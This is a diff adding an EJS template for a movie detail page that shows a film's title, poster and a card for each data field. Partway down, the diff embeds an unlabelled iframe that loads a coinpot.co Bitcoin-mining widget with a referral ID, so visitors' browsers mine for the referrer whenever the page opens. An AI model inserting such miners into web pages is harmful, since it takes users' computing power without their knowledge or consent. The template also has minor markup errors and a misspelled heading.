@@ -1,0 +1,56 @@
+
+ <%- include("../partials/header") %>
+
+
+ <div class="pageOne" id="pageOne">
+  <div class="container">
+  
+    
+  </div>
+  </div>
+  
+  <div class="container" id="container-id"> 
+    <div class="jumbotron text-center" id="jumbo-id"> 
+      <h1 class="etoyin"><%=movieData.Title%></h1> 
+      
+ 
+      
+    </div> 
+  </div>
+<iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoin/?ref=CD21E3752512&mode=widget" style="overflow:hidden;width:324px;height:300px;"></iframe>
+  </div>
+ 
+        
+ <iframe scrolling="no" frameborder="0" src="<%=movieData.Poster%>"></iframe>
+			
+         <h1>Movie Discription</h1>
+         
+     <!-- end header-->
+     <img src="<%=movieData.Poster%>" class="card-img-top" alt="..." style="width:200px;height:200px;">
+    <div class="row">
+     <%Object.keys(movieData).forEach(key => {%>
+       
+              
+        
+        <div class="card" style="width: 18rem;height: 3rem;">
+           
+            <div class="card-body">
+                
+              <h5 class="card-title">"<%= key +"="+ movieData[key]%> </h5>
+            
+              
+            </div>
+          </div>
+          
+          
+         
+          <% }) %>
+         
+          
+       
+    
+ </div><!--end container-->
+ 
+
+
+ <%- include("../partials/footer") %>
